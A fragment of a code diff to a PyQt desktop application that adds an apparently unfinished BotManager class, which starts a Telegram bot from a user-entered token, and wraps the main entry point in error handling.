@@ -2556,6 +2687,7 @@ class MainWindow(QtWidgets.QMainWindow):
         user_info = {
             "token": token,
             "botname": botname,
+            # Add other necessary fields here based on your table structure
         }
     
         # Save user information
@@ -2614,10 +2746,44 @@ class MainWindow(QtWidgets.QMainWindow):
 
 
 
-if __name__ == "__main__":
-    app = QApplication(sys.argv)
-    main_window = MainWindow()
-    main_window.show()
 
-    # Run the event loop
-    sys.exit(app.exec_())
+
+
+
+class BotManager:
+    def __init__(self):
+        self.bot = None
+        self.app = QApplication([])
+        self.ui = YourUIClass()
+        self.ui.setup_ui()  # Assuming you have a method to set up the UI
+        self.ui.bot_manager_text_input.textChanged.connect(self.initialize_bot)
+
+    def initialize_bot(self):
+        token = self.ui.bot_manager_text_input.toPlainText().strip()
+        if token:
+            self.bot = telebot.TeleBot(token)
+            setup_handlers(self.bot)
+            # Start polling in a separate thread
+            import threading
+            threading.Thread(target=self.bot.polling, daemon=True).start()
+
+    def run(self):
+        self.ui.show()
+        self.app.exec_()
+
+
+
+
+
+
+if __name__ == "__main__":
+    try:
+        app = QApplication(sys.argv)
+        main_window = MainWindow()
+        main_window.show()
+
+        # Run the event loop
+        sys.exit(app.exec_())
+    except Exception as e:
+        logging.error(f"An error occurred: {e}")
+        QMessageBox.critical(None, "Error", f"An unexpected error occurred: {str(e)}")
